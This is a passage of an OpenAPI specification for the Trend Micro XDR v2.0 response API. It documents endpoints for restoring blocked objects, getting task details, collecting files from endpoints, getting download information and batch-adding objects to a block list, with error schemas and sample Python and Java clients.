                          "example": "PartialContent"
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "task duplicated"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "bad argument",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Bad argument",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "BadArgument"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Product not connected"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "Unauthorized",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Unauthorized",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "Unauthorized"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "The token expires"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "PermissionDeny",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "description": "error info",
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
                          "enum": [
                            "PermissionDeny"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "Role denied"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "404": {
            "description": "NotFound",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "NotFound",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "NotFound"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Not found"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "internal error",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Internal error",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "description": "task error info",
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
                          "example": "InternalError"
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "DB error."
                        }
                      }
                    },
                    "actionId": {
                      "description": "action id",
                      "example": 88139521,
                      "type": "string"
                    }
                  }
                }
              }
            }
          }
        },
        "tags": [
          "Common"
        ],
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/response/restoreBlock'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'valueType': 'YOUR_VALUETYPE (string)',\n    'targetValue': 'YOUR_TARGETVALUE (string)',\n    'productId': 'YOUR_PRODUCTID (string)',\n    'description': 'YOUR_DESCRIPTION (string)'\n}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/response/restoreBlock\";\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"valueType\\\": \\\"YOUR_VALUETYPE (string)\\\",\" +\n                \"    \\\"targetValue\\\": \\\"YOUR_TARGETVALUE (string)\\\",\" +\n                \"    \\\"productId\\\": \\\"YOUR_PRODUCTID (string)\\\",\" +\n                \"    \\\"description\\\": \\\"YOUR_DESCRIPTION (string)\\\"\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/response/getTask": {
      "get": {
        "summary": "Get response task details",
        "description": "Retrieves information about a specific response task\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Response Management</b><br>\n  <ul>\n    <li>View, filter, and search (Task List tab)</li>\n  </ul>\n\n</div>\n",
        "parameters": [
          {
            "name": "actionId",
            "in": "query",
            "required": true,
            "schema": {
              "type": "string",
              "example": 88139521
            }
          }
        ],
        "responses": {
          "200": {
            "description": "OK",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "data"
                  ],
                  "properties": {
                    "data": {
                      "description": "task info",
                      "type": "object",
                      "properties": {
                        "createdTime": {
                          "type": "integer",
                          "example": 1589525651
                        },
                        "executedTime": {
                          "type": "integer",
                          "example": 1589525725
                        },
                        "finishedTime": {
                          "type": "integer",
                          "example": 1589525725
                        },
                        "taskStatus": {
                          "type": "string",
                          "example": "timeout",
                          "enum": [
                            "pending",
                            "queued",
                            "ongoing",
                            "success",
                            "failed",
                            "timeout",
                            "skipped",
                            "canceled",
                            "pendingApproval",
                            "rejected"
                          ]
                        },
                        "error": {
                          "description": "task error info",
                          "type": "object",
                          "required": [
                            "code",
                            "message"
                          ],
                          "properties": {
                            "code": {
                              "type": "string",
                              "description": "error class",
                              "example": "InternalError"
                            },
                            "message": {
                              "type": "string",
                              "description": "detail error message",
                              "example": "DB error."
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "bad argument",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Bad argument",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "BadArgument"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Product not connected"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "Unauthorized",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Unauthorized",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "Unauthorized"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "The token expires"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "PermissionDeny",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "description": "error info",
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
                          "enum": [
                            "PermissionDeny"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "Role denied"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "404": {
            "description": "NotFound",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "NotFound",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "NotFound"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Not found"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "internal error",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "description": "task error info",
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
                          "example": "InternalError"
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "DB error."
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "tags": [
          "Common"
        ],
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/response/getTask'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {\n    'actionId': 'YOUR_ACTIONID (string)'\n}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/response/getTask\";\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addParameter(\"actionId\", \"YOUR_ACTIONID (string)\")\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/response/collectFile": {
      "post": {
        "summary": "Collect file",
        "description": "Compresses a file on an endpoint in a password-protected archive and\nthen sends the archive to the XDR service platform\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Response Management</b><br>\n  <ul>\n    <li>View, filter, and search (Task List tab)</li>\n    <li>Collect file</li>\n  </ul>\n\n</div>\n",
        "tags": [
          "Endpoint"
        ],
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "type": "object",
                "required": [
                  "computerId",
                  "filePath",
                  "productId",
                  "os"
                ],
                "properties": {
                  "description": {
                    "description": "",
                    "type": "string",
                    "example": "collect file"
                  },
                  "productId": {
                    "description": "",
                    "type": "string",
                    "enum": [
                      "sao",
                      "xes",
                      "sds"
                    ],
                    "example": "sao"
                  },
                  "computerId": {
                    "description": "",
                    "type": "string",
                    "example": "bcee207f-21d6-4794-8e62-78d72ee82ed3"
                  },
                  "filePath": {
                    "description": "",
                    "type": "string",
                    "example": "C:\\Users\\tmvmi\\Desktop\\xxx.log"
                  },
                  "os": {
                    "description": "",
                    "type": "string",
                    "enum": [
                      "windows",
                      "mac",
                      "linux"
                    ],
                    "example": "windows"
                  }
                }
              }
            }
          }
        },
        "responses": {
          "200": {
            "description": "OK",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "actionId",
                    "taskStatus"
                  ],
                  "properties": {
                    "actionId": {
                      "description": "8 digit group id to identify action",
                      "example": 88139521,
                      "type": "string"
                    },
                    "taskStatus": {
                      "description": "task status",
                      "type": "string",
                      "example": "pending",
                      "enum": [
                        "pending"
                      ]
                    }
                  }
                }
              }
            }
          },
          "206": {
            "description": "duplicate action",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
                          "example": "PartialContent"
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "task duplicated"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "bad argument",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Bad argument",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "BadArgument"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Product not connected"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "Unauthorized",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Unauthorized",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "Unauthorized"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "The token expires"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "PermissionDeny",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "description": "error info",
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
                          "enum": [
                            "PermissionDeny"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "Role denied"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "404": {
            "description": "NotFound",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "NotFound",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "NotFound"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Not found"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "internal error",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Internal error",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "description": "task error info",
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
                          "example": "InternalError"
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "DB error."
                        }
                      }
                    },
                    "actionId": {
                      "description": "action id",
                      "example": 88139521,
                      "type": "string"
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/response/collectFile'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'description': 'YOUR_DESCRIPTION (string)',\n    'productId': 'YOUR_PRODUCTID (string)',\n    'computerId': 'YOUR_COMPUTERID (string)',\n    'filePath': 'YOUR_FILEPATH (string)',\n    'os': 'YOUR_OS (string)'\n}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/response/collectFile\";\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"description\\\": \\\"YOUR_DESCRIPTION (string)\\\",\" +\n                \"    \\\"productId\\\": \\\"YOUR_PRODUCTID (string)\\\",\" +\n                \"    \\\"computerId\\\": \\\"YOUR_COMPUTERID (string)\\\",\" +\n                \"    \\\"filePath\\\": \\\"YOUR_FILEPATH (string)\\\",\" +\n                \"    \\\"os\\\": \\\"YOUR_OS (string)\\\"\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/response/downloadInfo": {
      "get": {
        "summary": "Get download information for collected file",
        "description": "Retrieves a URL and other information required to download a collected file\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Response Management</b><br>\n  <ul>\n    <li>View, filter, and search (Task List tab)</li>\n    <li>Download task result</li>\n  </ul>\n\n</div>\n",
        "tags": [
          "Common"
        ],
        "parameters": [
          {
            "name": "actionId",
            "required": true,
            "in": "query",
            "schema": {
              "type": "string",
              "example": 3166
            }
          }
        ],
        "responses": {
          "200": {
            "description": "OK",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "data"
                  ],
                  "properties": {
                    "data": {
                      "description": "download info",
                      "type": "object",
                      "properties": {
                        "url": {
                          "type": "string"
                        },
                        "expires": {
                          "type": "string",
                          "example": "2011-10-05T14:48:00.000Z"
                        },
                        "password": {
                          "type": "string"
                        },
                        "filename": {
                          "type": "string"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "bad argument",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Bad argument",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "BadArgument"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Product not connected"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "Unauthorized",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Unauthorized",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "Unauthorized"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "The token expires"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "PermissionDeny",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "description": "error info",
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
                          "enum": [
                            "PermissionDeny"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "Role denied"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "404": {
            "description": "NotFound",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "NotFound",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "NotFound"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Not found"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "internal error",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "description": "task error info",
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
                          "example": "InternalError"
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "DB error."
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/response/downloadInfo'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {\n    'actionId': 'YOUR_ACTIONID (string)'\n}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/response/downloadInfo\";\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addParameter(\"actionId\", \"YOUR_ACTIONID (string)\")\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/response/batchBlock": {
      "post": {
        "summary": "Add to block list (multiple objects)",
        "description": "Adds multiple file SHA-1, IP address, domain, or URL objects to the User-Defined Suspicious Objects List, which blocks the objects on subsequent detections\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Response Management</b><br>\n  <ul>\n    <li>View, filter, and search (Task List tab)</li>\n    <li>Add to block list</li>\n  </ul>\n  <b>Suspicious Object Management</b><br>\n  <ul>\n    <li>View, filter, and search</li>\n    <li>Manage lists and configure settings</li>\n  </ul>\n\n</div>\n",
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "type": "object",
                "required": [
                  "items"
                ],
                "properties": {
                  "items": {
                    "description": "An array consisted of block items",
                    "type": "array",
                    "items": {
                      "type": "object",
                      "required": [
                        "valueType",
                        "targetValue"
                      ],
                      "properties": {
                        "valueType": {
                          "description": "block item value type",
                          "type": "string",
                          "enum": [
                            "file_sha1",
                            "ip",
                            "domain",
                            "url",
                            "mailbox"
                          ],
                          "example": "file_sha1"
                        },
                        "targetValue": {
                          "description": "item value info",
                          "type": "string",
                          "example": "2de5c1125d5f991842727ed8ea8b5fda0ffa249b"
                        },
                        "description": {
                          "description": "action description",
                          "type": "string",
                          "example": "block info"
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "responses": {
          "200": {
            "description": "OK",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "data"
                  ],
                  "properties": {
                    "data": {
                      "description": "An array of created result",
                      "type": "array",
                      "items": {
                        "type": "object",
                        "required": [
                          "actionId",
                          "taskStatus",
                          "targetValue"
                        ],
                        "properties": {
                          "valueType": {
                            "description": "block item value type",
                            "type": "string",
                            "enum": [
                              "file_sha1",
                              "ip",
                              "domain",
                              "url",
                              "mailbox"
                            ],
                            "example": "file_sha1"
                          },
                          "targetValue": {
                            "description": "item value info",
                            "type": "string",
                            "example": "2de5c1125d5f991842727ed8ea8b5fda0ffa249b"
                          },
                          "actionId": {
                            "description": "8 digit group id to identify action",
                            "example": 88139521,
                            "type": "string"
                          },
                          "taskStatus": {
                            "description": "task status",
                            "type": "string",
                            "example": "pending",
                            "enum": [
                              "pending"
                            ]
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "206": {
            "description": "duplicate action",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "data"
                  ],
                  "properties": {
                    "data": {
                      "description": "An array of results",
                      "type": "array",
                      "items": {
                        "type": "object",
                        "required": [
                          "actionId",
                          "error",
                          "targetValue"
                        ],
                        "properties": {
                          "valueType": {
